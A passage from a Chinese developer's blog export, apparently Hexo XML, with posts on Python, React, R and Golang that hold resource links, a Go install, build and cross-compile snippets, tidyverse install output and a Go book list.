<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">$ python</span><br><span class="line">Python <span class="number">2.7</span><span class="number">.15</span> (default, Oct <span class="number">23</span> <span class="number">2018</span>, <span class="number">19</span>:<span class="number">08</span>:<span class="number">43</span>)</span><br><span class="line">[GCC <span class="number">4.4</span><span class="number">.7</span> <span class="number">20120313</span> (Red Hat <span class="number">4.4</span><span class="number">.7</span><span class="number">-23</span>)] on linux2</span><br><span class="line">Type <span class="string">"help"</span>, <span class="string">"copyright"</span>, <span class="string">"credits"</span> <span class="keyword">or</span> <span class="string">"license"</span> <span class="keyword">for</span> more information.</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> ssl</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><ul>
<li><a href="https://riboseyim.github.io/2017/05/26/Language/" target="_blank" rel="noopener">玩转编程语言系列</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><h4 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h4><p><a href="https://www.analyticsvidhya.com/blog/2015/09/full-cheatsheet-machine-learning-algorithms/" target="_blank" rel="noopener">https://www.analyticsvidhya.com/blog/2015/09/full-cheatsheet-machine-learning-algorithms/</a></p>
<h4 id="Python基础"><a href="#Python基础" class="headerlink" title="Python基础"></a>Python基础</h4><p><a href="http://datasciencefree.com/python.pdf" target="_blank" rel="noopener">http://datasciencefree.com/python.pdf</a><br><a href="https://www.datacamp.com/community/tutorials/python-data-science-cheat-sheet-basics#gs.0x1rxEA" target="_blank" rel="noopener">https://www.datacamp.com/community/tutorials/python-data-science-cheat-sheet-basics#gs.0x1rxEA</a></p>
<h4 id="Numpy"><a href="#Numpy" class="headerlink" title="Numpy"></a>Numpy</h4><p><a href="https://www.dataquest.io/blog/numpy-cheat-sheet/" target="_blank" rel="noopener">https://www.dataquest.io/blog/numpy-cheat-sheet/</a><br><a href="http://datasciencefree.com/numpy.pdf" target="_blank" rel="noopener">http://datasciencefree.com/numpy.pdf</a><br><a href="https://www.datacamp.com/community/blog/python-numpy-cheat-sheet#gs.Nw3V6CE" target="_blank" rel="noopener">https://www.datacamp.com/community/blog/python-numpy-cheat-sheet#gs.Nw3V6CE</a><br><a href="https://github.com/donnemartin/data-science-ipython-notebooks/blob/master/numpy/numpy.ipynb" target="_blank" rel="noopener">https://github.com/donnemartin/data-science-ipython-notebooks/blob/master/numpy/numpy.ipynb</a></p>
<h4 id="Pandas"><a href="#Pandas" class="headerlink" title="Pandas"></a>Pandas</h4><p><a href="http://datasciencefree.com/pandas.pdf" target="_blank" rel="noopener">http://datasciencefree.com/pandas.pdf</a><br><a href="https://www.datacamp.com/community/blog/python-pandas-cheat-sheet#gs.S4P4T=U" target="_blank" rel="noopener">https://www.datacamp.com/community/blog/python-pandas-cheat-sheet#gs.S4P4T=U</a><br><a href="https://github.com/donnemartin/data-science-ipython-notebooks/blob/master/pandas/pandas.ipynb" target="_blank" rel="noopener">https://github.com/donnemartin/data-science-ipython-notebooks/blob/master/pandas/pandas.ipynb</a></p>
<h4 id="Matplotlib"><a href="#Matplotlib" class="headerlink" title="Matplotlib"></a>Matplotlib</h4><p><a href="https://www.datacamp.com/community/blog/python-matplotlib-cheat-sheet" target="_blank" rel="noopener">https://www.datacamp.com/community/blog/python-matplotlib-cheat-sheet</a><br><a href="https://github.com/donnemartin/data-science-ipython-notebooks/blob/master/matplotlib/matplotlib.ipynb" target="_blank" rel="noopener">https://github.com/donnemartin/data-science-ipython-notebooks/blob/master/matplotlib/matplotlib.ipynb</a></p>
<h4 id="Scikit-Learn"><a href="#Scikit-Learn" class="headerlink" title="Scikit Learn"></a>Scikit Learn</h4><p><a href="https://www.datacamp.com/community/blog/scikit-learn-cheat-sheet#gs.fZ2A1Jk" target="_blank" rel="noopener">https://www.datacamp.com/community/blog/scikit-learn-cheat-sheet#gs.fZ2A1Jk</a><br><a href="http://peekaboo-vision.blogspot.de/2013/01/machine-learning-cheat-sheet-for-scikit.html" target="_blank" rel="noopener">http://peekaboo-vision.blogspot.de/2013/01/machine-learning-cheat-sheet-for-scikit.html</a><br><a href="https://github.com/rcompton/ml_cheat_sheet/blob/master/supervised_learning.ipynb" target="_blank" rel="noopener">https://github.com/rcompton/ml_cheat_sheet/blob/master/supervised_learning.ipynb</a></p>
<h4 id="TensorFlow"><a href="#TensorFlow" class="headerlink" title="TensorFlow"></a>TensorFlow</h4><p><a href="https://github.com/aymericdamien/TensorFlow-Examples/blob/master/notebooks/1_Introduction/basic_operations.ipynb" target="_blank" rel="noopener">https://github.com/aymericdamien/TensorFlow-Examples/blob/master/notebooks/1_Introduction/basic_operations.ipynb</a></p>
<h4 id="PyTorch"><a href="#PyTorch" class="headerlink" title="PyTorch"></a>PyTorch</h4><p><a href="https://github.com/bfortuner/pytorch-cheatsheet" target="_blank" rel="noopener">https://github.com/bfortuner/pytorch-cheatsheet</a></p>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>Developer</tag>
      </tags>
  </entry>
  <entry>
    <title>Language-React-lang</title>
    <url>/2018/07/07/Language-React-lang/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><a id="more"></a>
<h2 id="Introduction-React-简介"><a href="#Introduction-React-简介" class="headerlink" title="Introduction | React 简介"></a>Introduction | React 简介</h2><ul>
<li><a href="https://github.com/adam-golab/react-developer-roadmap" target="_blank" rel="noopener">React developer roadmap</a></li>
</ul>
<h2 id="Core-Concept-核心概念"><a href="#Core-Concept-核心概念" class="headerlink" title="Core Concept | 核心概念"></a>Core Concept | 核心概念</h2><h4 id="Concept-A"><a href="#Concept-A" class="headerlink" title="Concept A"></a>Concept A</h4><h4 id="Concept-B"><a href="#Concept-B" class="headerlink" title="Concept B"></a>Concept B</h4><h4 id="Concept-C"><a href="#Concept-C" class="headerlink" title="Concept C"></a>Concept C</h4><h2 id="Architecture-React-架构"><a href="#Architecture-React-架构" class="headerlink" title="Architecture | React 架构"></a>Architecture | React 架构</h2><h2 id="Best-Practice-React-最佳实践"><a href="#Best-Practice-React-最佳实践" class="headerlink" title="Best Practice | React 最佳实践"></a>Best Practice | React 最佳实践</h2><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2>]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
  </entry>
  <entry>
    <title>玩转编程语言:基于Golang构建网络数据爬虫</title>
    <url>/2017/12/21/Language-Go-lang-Spider/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li><a href="https://riboseyim.github.io/2017/05/12/Visualization-Charts/" target="_blank" rel="noopener">数据可视化（五）基于网络爬虫制作数据可视化图表</a></li>
</ul>
<a id="more"></a>
<h2 id="初级爬虫"><a href="#初级爬虫" class="headerlink" title="初级爬虫"></a>初级爬虫</h2><h4 id="数据可视化（五）基于网络爬虫制作数据可视化图表"><a href="#数据可视化（五）基于网络爬虫制作数据可视化图表" class="headerlink" title="数据可视化（五）基于网络爬虫制作数据可视化图表"></a><a href="https://riboseyim.github.io/2017/05/12/Visualization-Charts/" target="_blank" rel="noopener">数据可视化（五）基于网络爬虫制作数据可视化图表</a></h4><ul>
<li>图表数据可视化技术方案</li>
<li>基于网络爬虫的可视化图表</li>
<li>案例：最近十年全国彩票销售变化情况 <a href="https://riboseyim.github.io/charts/caipiao/index.html" target="_blank" rel="noopener">在线演示</a></li>
<li>案例：中国科学院院士分布（出生地与籍贯）<a href="https://riboseyim.github.io/charts/casad/index.html" target="_blank" rel="noopener">在线演示</a></li>
<li>案例：美国航空入境旅客（出发地）变化情况 <a href="https://riboseyim.github.io/charts/usa-traffic/index.html" target="_blank" rel="noopener">在线演示</a></li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Go-lang-Spider.png" alt></p>
<h2 id="中高级爬虫"><a href="#中高级爬虫" class="headerlink" title="中高级爬虫"></a>中高级爬虫</h2><ul>
<li>User Agent</li>
<li>IP</li>
<li>Ajax 数据</li>
<li>登录</li>
<li>验证码</li>
</ul>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><ul>
<li><a href="https://riboseyim.github.io/2017/05/26/Language/" target="_blank" rel="noopener">玩转编程语言系列</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://github.com/BruceDone/awesome-crawler" target="_blank" rel="noopener">开源爬虫项目列表</a></li>
<li><a href="https://godoc.org/rsc.io/pdf" target="_blank" rel="noopener">Package pdf</a></li>
<li><a href="https://github.com/celrenheit/spider" target="_blank" rel="noopener">Scheduler of spiders for scraping and parsing HTML and JSON pages</a></li>
<li><a href="https://blog.gopheracademy.com/advent-2018/go-in-the-browser/" target="_blank" rel="noopener">Go and WebAssembly: running Go programs in your browser</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>Developer</tag>
        <tag>Golang</tag>
      </tags>
  </entry>
  <entry>
    <title>玩转编程语言:R</title>
    <url>/2017/05/16/Language-R-lang/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><a id="more"></a>
<h2 id="Introduction-简介"><a href="#Introduction-简介" class="headerlink" title="Introduction | 简介"></a>Introduction | 简介</h2><h2 id="Core-Concept-核心概念"><a href="#Core-Concept-核心概念" class="headerlink" title="Core Concept | 核心概念"></a>Core Concept | 核心概念</h2><h4 id="Concept-A"><a href="#Concept-A" class="headerlink" title="Concept A"></a>Concept A</h4><h4 id="Concept-B"><a href="#Concept-B" class="headerlink" title="Concept B"></a>Concept B</h4><h4 id="Concept-C"><a href="#Concept-C" class="headerlink" title="Concept C"></a>Concept C</h4><h2 id="Architecture-架构"><a href="#Architecture-架构" class="headerlink" title="Architecture | 架构"></a>Architecture | 架构</h2><h2 id="Best-Practice-最佳实践"><a href="#Best-Practice-最佳实践" class="headerlink" title="Best Practice | 最佳实践"></a>Best Practice | 最佳实践</h2><h4 id="R-Markdown"><a href="#R-Markdown" class="headerlink" title="R Markdown"></a>R Markdown</h4><ul>
<li><a href="https://rmarkdown.rstudio.com/" target="_blank" rel="noopener">R Markdown from R Studio</a></li>
<li><a href="https://github.com/rstudio/rmarkdown" target="_blank" rel="noopener">github.com/rstudio/rmarkdown</a></li>
</ul>
<h4 id="R-for-data-science"><a href="#R-for-data-science" class="headerlink" title="R for data science"></a>R for data science</h4><ul>
<li><a href="https://www.tidyverse.org/" target="_blank" rel="noopener">R packages for data science</a></li>
</ul>
<p><img src="https://d33wubrfki0l68.cloudfront.net/b88ef926a004b0fce72b2526b0b5c4413666a4cb/ad0a8/images/cover.png" alt></p>
<ul>
<li>20 Best Libraries For Data Science</li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/R-Top-20-Lib-2018.jpg" alt></p>
<h4 id="Visualization-based-on-R-and-Go"><a href="#Visualization-based-on-R-and-Go" class="headerlink" title="Visualization based on R and Go"></a>Visualization based on R and Go</h4><ul>
<li><p><a href="https://riboseyim.github.io/2018/12/16/Visualization-SocialNetwork" target="_blank" rel="noopener">数据可视化：Program , Data and Classical  Music</a></p>
</li>
<li><p>基于 Go + R 可视化古典音乐作曲家社交网络</p>
</li>
<li>Coperformance 是一个业余项目，融合了作者对编程，数据和古典音乐的兴趣爱好。</li>
</ul>
<h2 id="R-ABC"><a href="#R-ABC" class="headerlink" title="R ABC"></a>R ABC</h2><h4 id="Install-R"><a href="#Install-R" class="headerlink" title="Install R"></a>Install R</h4><p>R 的主版本每年发布一次。</p>
<ul>
<li>网址：<a href="https://cloud.r-project.org" target="_blank" rel="noopener">https://cloud.r-project.org</a></li>
</ul>
<h4 id="Install-RStudio"><a href="#Install-RStudio" class="headerlink" title="Install RStudio"></a>Install RStudio</h4><p>RStudio 是用于 R 编程的一种集成开发环境。</p>
<ul>
<li>网址：<a href="https://www.rstudio.com/download" target="_blank" rel="noopener">https://www.rstudio.com/download</a></li>
</ul>
<h4 id="Install-tidyverse"><a href="#Install-tidyverse" class="headerlink" title="Install tidyverse"></a>Install tidyverse</h4><p>R 编程有很多常用的依赖包，提供对 R 基础功能扩展，比较常用的是 tidyverse。</p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">&gt;install.packages(<span class="string">"tidyverse"</span>)</span><br><span class="line"></span><br><span class="line">&gt; <span class="keyword">library</span>(<span class="string">"tidyverse"</span>)</span><br><span class="line">─ Attaching packages ───────────────────── tidyverse <span class="number">1.2</span><span class="number">.1</span> ─</span><br><span class="line">✔ ggplot2 <span class="number">3.2</span><span class="number">.0</span>     ✔ purrr   <span class="number">0.3</span><span class="number">.2</span></span><br><span class="line">✔ tibble  <span class="number">2.1</span><span class="number">.3</span>     ✔ dplyr   <span class="number">0.8</span><span class="number">.3</span></span><br><span class="line">✔ tidyr   <span class="number">0.8</span><span class="number">.3</span>     ✔ stringr <span class="number">1.4</span><span class="number">.0</span></span><br><span class="line">✔ readr   <span class="number">1.3</span><span class="number">.1</span>     ✔ forcats <span class="number">0.4</span><span class="number">.0</span></span><br><span class="line">─ Conflicts ────────────────────── tidyverse_conflicts() ─</span><br><span class="line">✖ dplyr::filter() masks stats::filter()</span><br><span class="line">✖ dplyr::lag()    masks stats::lag()</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><ul>
<li><a href="https://riboseyim.github.io/2017/05/26/Language/" target="_blank" rel="noopener">玩转编程语言系列</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://towardsdatascience.com/r-lang-zero-to-hero-c59a9f66841c" target="_blank" rel="noopener">R Lang: Zero to Hero | A guide for statistical computing and graphics.</a></li>
<li><a href="https://activewizards.com/blog/top-20-r-libraries-for-data-science-in-2018-infographic/" target="_blank" rel="noopener">Top 20 R Libraries for Data Science in 2018 </a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>Developer</tag>
      </tags>
  </entry>
  <entry>
    <title>Catalog：玩转编程语言 - Golang 专题</title>
    <url>/2017/05/05/Language-Go-lang/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>ABC</li>
<li>基于 Golang 的应用</li>
<li>Golang 最佳实践</li>
</ul>
<span id="more"></span>
<h4 id="围棋十诀"><a href="#围棋十诀" class="headerlink" title="围棋十诀"></a>围棋十诀</h4><blockquote>
<p>一、不得贪胜。<br>二、入界宜缓。<br>三、攻彼顾我。<br>四、弃子争先。<br>五、舍小就大。<br>六、逢危须弃。<br>七、慎勿轻速。<br>八、动须相应。<br>九、彼强自保。<br>十、势孤取和。<br>————（唐）王积薪</p>
</blockquote>
<h2 id="一、ABC"><a href="#一、ABC" class="headerlink" title="一、ABC"></a>一、ABC</h2><ul>
<li><a href="https://gobyexample.com/">Go by Example</a></li>
<li><a href="https://www.cybrhome.com/topic/go-language-tutorials">Popular sites, blogs and tutorials for learning and mastering Go Language</a></li>
<li><a href="https://quii.gitbook.io/learn-go-with-tests">Learn Go with tests</a></li>
</ul>
<h4 id="1-1-Install"><a href="#1-1-Install" class="headerlink" title="1.1 Install"></a>1.1 Install</h4><ul>
<li><a href="https://go.googlesource.com/go/">https://go.googlesource.com/go/</a></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tar -C /usr/<span class="built_in">local</span>/go-<span class="variable">$version</span> -xvf go-<span class="variable">$version</span>.tar.gz</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> /usr/<span class="built_in">local</span>/go-<span class="variable">$version</span>/src</span><br><span class="line">./all_bash</span><br><span class="line"></span><br><span class="line"><span class="comment">#compile,build and test</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">unset</span> GOROOT</span><br><span class="line"><span class="built_in">unset</span> GOPATH</span><br><span class="line"><span class="built_in">unset</span> GOAPPATH</span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> GOROOT=/usr/<span class="built_in">local</span>/go</span><br><span class="line"><span class="built_in">export</span> GOPATH=<span class="variable">$GOROOT</span>/bin</span><br><span class="line"><span class="built_in">export</span> GOAPPATH=<span class="variable">$GOROOT</span>/bin/bin</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:<span class="variable">$GOPATH</span>:<span class="variable">$GOAPPATH</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="1-2-Go-Version-Manage"><a href="#1-2-Go-Version-Manage" class="headerlink" title="1.2 Go Version Manage"></a>1.2 Go Version Manage</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">//atom 代码提示</span></span><br><span class="line"><span class="keyword">go</span> get -u github.com/jstemmer/gotags</span><br><span class="line"><span class="comment">//源代码目录执行</span></span><br><span class="line">gotags -tag-relative=<span class="literal">true</span> -R=<span class="literal">true</span> -sort=<span class="literal">true</span> -f=<span class="string">&quot;tags&quot;</span> -fields=+l .  </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li>build</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">## 交叉编译</span><br><span class="line"></span><br><span class="line">build-linux:</span><br><span class="line">	export CGO_ENABLED=0 &amp;&amp; export GOOS=linux &amp;&amp; export GOARCH=amd64 &amp;&amp; go build</span><br><span class="line">build-wins:</span><br><span class="line">	export CGO_ENABLED=0 &amp;&amp; export GOOS=windows &amp;&amp; export GOARCH=amd64 &amp;&amp; go build</span><br><span class="line">build-solaris:</span><br><span class="line">  export CGO_ENABLED=0 &amp;&amp; export GOOS=solaris &amp;&amp; export GOARCH=amd64 &amp;&amp; go build</span><br><span class="line"></span><br><span class="line">## Go supports Solaris 11 on amd64, but not sparc.To build for sparc you need to use gccgo.</span><br><span class="line"></span><br><span class="line">## 压缩</span><br><span class="line">go build -ldflags &#x27;-w -s&#x27;</span><br></pre></td></tr></table></figure>
<h2 id="二、基于-Golang-的应用"><a href="#二、基于-Golang-的应用" class="headerlink" title="二、基于 Golang 的应用"></a>二、基于 Golang 的应用</h2><h4 id="2-1-基于Go语言构建RESTful-JSON-API"><a href="#2-1-基于Go语言构建RESTful-JSON-API" class="headerlink" title="2.1 基于Go语言构建RESTful JSON API"></a>2.1 <a href="https://riboseyim.github.io/2017/05/23/RestfulAPI/">基于Go语言构建RESTful JSON API</a></h4><h4 id="2-2-基于Kafka构建事件溯源模式的微服务"><a href="#2-2-基于Kafka构建事件溯源模式的微服务" class="headerlink" title="2.2 基于Kafka构建事件溯源模式的微服务"></a>2.2 <a href="https://riboseyim.github.io/2017/06/12/OpenSource-Kafka-Microservice/">基于Kafka构建事件溯源模式的微服务</a></h4><p>讨论如何借助Kafka实现分布式消息管理，使用事件溯源（Event Sourcing）模式实现原子化数据处理，使用CQRS模式（Command-Query Responsibility Segregation ）实现查询职责分离，使用消费者群组解决单点故障问题，理解分布式协调框架Zookeeper的运行机制。整个应用的代码实现使用Go语言描述。</p>
<h4 id="2-3-开源技术架构漫谈：应用程序开发中的日志管理"><a href="#2-3-开源技术架构漫谈：应用程序开发中的日志管理" class="headerlink" title="2.3 开源技术架构漫谈：应用程序开发中的日志管理"></a>2.3 <a href="https://riboseyim.github.io/2017/05/24/Log/">开源技术架构漫谈：应用程序开发中的日志管理</a></h4><h4 id="2-4-网络数据包的捕获、过滤和分析-Packet-Capturing"><a href="#2-4-网络数据包的捕获、过滤和分析-Packet-Capturing" class="headerlink" title="2.4 网络数据包的捕获、过滤和分析(Packet Capturing)"></a>2.4 <a href="https://riboseyim.github.io/2017/06/16/Network-Pcap/">网络数据包的捕获、过滤和分析(Packet Capturing)</a></h4><ul>
<li>What is Packet Capturing</li>
<li>How can it be used</li>
<li>What is libpcap</li>
<li>What is tcpdump &amp; winpcap &amp; snoop</li>
<li>What is BPF</li>
<li>What is gopacket</li>
</ul>
<h4 id="2-5-数据可视化（五）基于网络爬虫制作可视化图表"><a href="#2-5-数据可视化（五）基于网络爬虫制作可视化图表" class="headerlink" title="2.5 数据可视化（五）基于网络爬虫制作可视化图表"></a>2.5 <a href="https://riboseyim.github.io/2017/05/12/Visualization-Charts/">数据可视化（五）基于网络爬虫制作可视化图表</a></h4><ul>
<li>基于网络爬虫的可视化图表:golang,goquery</li>
<li>案例：最近十年全国彩票销售变化情况</li>
<li>案例：中国科学院院士分布</li>
<li>数据可视化技术方案:基于 SVG (D3、Raphael)、基于 Canvas（Echarts）</li>
</ul>
<h2 id="三、Golang-最佳实践"><a href="#三、Golang-最佳实践" class="headerlink" title="三、Golang 最佳实践"></a>三、Golang 最佳实践</h2><h4 id="3-1-Grammar-Tips-amp-Simple-Demo"><a href="#3-1-Grammar-Tips-amp-Simple-Demo" class="headerlink" title="3.1 Grammar Tips &amp; Simple Demo"></a>3.1 Grammar Tips &amp; Simple Demo</h4><ul>
<li><a href="http://crwd.fr/2oDS2RF">Port Forwarding with Go (zupzup.org)</a></li>
<li><a href="https://lanreadelowo.com/blog/2017/04/03/http-in-go/">A guide to understanding HTTP Request handling and processing in Go</a></li>
<li><a href="https://dave.cheney.net/2017/04/26/understand-go-pointers-in-less-than-800-words-or-your-money-back">Understand Go pointers in less than 800 words </a></li>
<li><a href="https://dave.cheney.net/2017/04/29/there-is-no-pass-by-reference-in-go">there-is-no-pass-by-reference-in-go</a></li>
<li><a href="http://life.leanote.com/post/%E8%AE%A9-go-get-%E6%98%BE%E7%A4%BA%E8%BF%9B%E5%BA%A6">让go get显示进度</a></li>
<li><a href="http://life.leanote.com/post/golang-exec%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E5%AE%9E%E6%97%B6%E8%BE%93%E5%87%BA">exec.Command()实时输出</a></li>
<li><a href="https://geeks.uniplaces.com/building-a-worker-pool-in-golang-1e6c0fdfd78c">Building a Worker Pool in Golang | Dynamically scalable queue consumer</a></li>
<li><a href="http://www.akshaydeo.com/blog/2017/12/23/How-did-I-improve-latency-by-700-percent-using-syncPool/">How did I improve latency by 700% using sync.Pool</a></li>
</ul>
<p>The interface is a tool so that you can wire dependencies just by their behaviour, not by how they implement that behaviour.</p>
<ul>
<li><a href="https://medium.com/full-stack-tips/golang-interfaces-26033f6a8858">Golang Interfaces</a></li>
<li><a href="http://yoursite.com/build-module-system-use-go-plugin/">用 Go Plugin 构建模块化系统</a></li>
</ul>
<h4 id="3-2-Specialist-Architecture"><a href="#3-2-Specialist-Architecture" class="headerlink" title="3.2 Specialist: Architecture"></a>3.2 Specialist: Architecture</h4><ul>
<li><p><a href="https://developer.salesforce.com/blogs/developer-relations/2017/05/using-einstein-vision-within-golang.html">Using Einstein Vision Within Golang （Waiting）</a><br>By Rajdeep Dua | Published: May 5, 2017<br>Einstein Vision is a service that helps you build smarter applications by using deep learning to automatically recognize images. It provides an API that lets you use image recognition to build AI-enabled apps.</p>
</li>
<li><p><a href="https://hackernoon.com/golang-clean-archithecture-efd6d7c43047">Trying Clean Architecture on Golang: Independent, Testable , and Clean</a><br>By Iman TumorangFollow | Passionate and Curious Learner in Software Engineering</p>
</li>
<li><p><a href="http://cholerae.com/2015/01/02/%E3%80%90%E7%BF%BB%E8%AF%91%E3%80%91%E7%94%9F%E6%B4%BB%E5%9C%A8%E6%B2%A1%E6%9C%89%E6%B3%9B%E5%9E%8B%E7%9A%84Go%E8%AF%AD%E8%A8%80%E4%B8%96%E7%95%8C%E9%87%8C/"> 【翻译】生活在没有泛型的Go语言世界里 | Cholerae</a></p>
</li>
<li><a href="https://hackernoon.com/5-reasons-why-we-switched-from-python-to-go-4414d5f42690">5 Reasons Why We switched from Python To Go</a></li>
</ul>
<h4 id="3-3-Go-Repository"><a href="#3-3-Go-Repository" class="headerlink" title="3.3 Go Repository"></a>3.3 Go Repository</h4><ul>
<li><a href="https://github.com/romanyx/jwalk">Walk through JSON with Go</a></li>
<li><a href="https://blog.gojekengineering.com/using-job-queues-in-go-for-resilient-systems-638526316e7e">Using job queues in Go for resilient systems</a></li>
<li><a href="http://www.gorillatoolkit.org/pkg/mux">mux router | Go Router Repository</a></li>
<li><a href="https://github.com/julienschmidt/httprouter">httprouter | Go Router Repository</a></li>
<li><p><a href="https://romain.rbind.io/blog/2017/06/09/go-packages-in-r-packages/">Go packages in R packages</a></p>
</li>
<li><p><a href="http://www.devdungeon.com/content/making-tor-http-requests-go">NanoDano:Making Tor HTTP Requests with Go | Socket Proxy</a></p>
</li>
<li><a href="https://github.com/rapidloop/vlan-nats">vlan-nats</a></li>
<li><a href="https://github.com/go-ego/riot">riot：Go Open Source, Distributed, Simple and efficient Search Engine</a></li>
<li><a href="https://k6.io">K6: A modern load testing tool, using Go and JavaScript</a></li>
<li><a href="https://phraseapp.com/blog/posts/internationalization-i18n-go/">internationalization-i18n-go</a></li>
</ul>
<h4 id="goproxy"><a href="#goproxy" class="headerlink" title="goproxy"></a><a href="https://github.com/snail007/goproxy/blob/master/README_ZH.md">goproxy</a></h4><p>golang实现的高性能http,https,websocket,tcp,udp,socks5代理服务器,支持正向代理、反向代理、透明代理、内网穿透、TCP/UDP端口映射、SSH中转，TLS加密传输，协议转换</p>
<ul>
<li><a href="https://github.com/elazarl/goproxy">Advanced Forwarding with Go github.com/elazarl/goproxy</a></li>
<li><a href="https://github.com/wybiral/reverseproxy">Encrypted reverse proxy in Go.</a></li>
<li><p><a href="https://git.oschina.net/tavenli/port-forward">TavenLi/port-forward</a></p>
</li>
<li><p>爬虫(简易型) ：<a href="https://github.com/lealife/leacrawler">https://github.com/lealife/leacrawler</a></p>
</li>
</ul>
<h4 id="3-3-Business-Product-List"><a href="#3-3-Business-Product-List" class="headerlink" title="3.3 Business Product List"></a>3.3 Business Product List</h4><ul>
<li><a href="https://www.influxdata.com">InfluxDB</a>:时间序列数据库，实时数据场景</li>
<li><a href="https://hackernoon.com/marketstore-the-financial-time-series-database-is-now-open-source-fd04343f439">Marketstore | The Financial Time Series Database</a></li>
<li><a href="https://filebrowser.github.io/">File Manager | Web Browser</a></li>
</ul>
<h2 id="Books"><a href="#Books" class="headerlink" title="Books"></a>Books</h2><h4 id="《Introducing-Go-Build-Reliable-Scalable-Programs》"><a href="#《Introducing-Go-Build-Reliable-Scalable-Programs》" class="headerlink" title="《Introducing Go: Build Reliable, Scalable Programs》"></a><a href="#">《Introducing Go: Build Reliable, Scalable Programs》</a></h4><ul>
<li>特点：精简</li>
<li><a href="https://www.amazon.com/Introducing-Go-Reliable-Scalable-Programs-ebook/dp/B01AB3G496/ref=mt_kindle?_encoding=UTF8&amp;me=&amp;qid=1529338751">预览链接</a></li>
<li>Others <a href="http://openmymind.net/The-Little-Go-Book/">《The Little Go Book》</a></li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Books_Introducing_Go.png" alt=""></p>
<h4 id="《The-Go-Programming-Language》"><a href="#《The-Go-Programming-Language》" class="headerlink" title="《The Go Programming Language》"></a>《The Go Programming Language》</h4><ul>
<li>特点：基础全面</li>
<li><a href="https://www.amazon.com/gp/product/0134190440/ref=as_li_tl?ie=UTF8&amp;camp=1789&amp;creative=9325&amp;creativeASIN=0134190440&amp;linkCode=as2&amp;tag=henrmota-20&amp;linkId=c841528d2e6d85f2bad943d19e4527e0">预览链接</a></li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Book_Go_Programming_Language.png" alt=""></p>
<h4 id="《Go-Web-Programming》"><a href="#《Go-Web-Programming》" class="headerlink" title="《Go Web Programming》"></a><a href="#">《Go Web Programming》</a></h4><ul>
<li>特点：Web Application</li>
<li><a href="https://www.amazon.com/gp/product/1617292567/ref=as_li_tl?ie=UTF8&amp;camp=1789&amp;creative=9325&amp;creativeASIN=1617292567&amp;linkCode=as2&amp;tag=henrmota-20&amp;linkId=f29795534888ac4c517e19b8afb0d6a5">预览链接</a></li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Books_Go_Web_Programming.png" alt=""></p>
<h4 id="Concurrency-in-Go-Tools-and-Techniques-for-Developers"><a href="#Concurrency-in-Go-Tools-and-Techniques-for-Developers" class="headerlink" title="Concurrency in Go: Tools and Techniques for Developers"></a>Concurrency in Go: Tools and Techniques for Developers</h4><ul>
<li>特点：Concurrency</li>
<li><a href="https://www.amazon.com/gp/product/1491941197/ref=as_li_tl?ie=UTF8&amp;camp=1789&amp;creative=9325&amp;creativeASIN=1491941197&amp;linkCode=as2&amp;tag=henrmota-20&amp;linkId=4b443a84ffbac9cc6101b2f492ec9e13">预览链接</a></li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Books_Concurrency_In_Go.png" alt=""></p>
<h4 id="《Go-Programming-Blueprints》"><a href="#《Go-Programming-Blueprints》" class="headerlink" title="《Go Programming Blueprints》"></a><a href="#">《Go Programming Blueprints》</a></h4><ul>
<li>特点：covers a lot of topics，such as web services,command-line tools,microservices and app deployment.</li>
<li><a href="https://www.amazon.com/gp/product/1786468948/ref=as_li_tl?ie=UTF8&amp;camp=1789&amp;creative=9325&amp;creativeASIN=1786468948&amp;linkCode=as2&amp;tag=henrmota-20&amp;linkId=ef8749456ce088e32381286f0743d251">预览链接</a></li>
</ul>
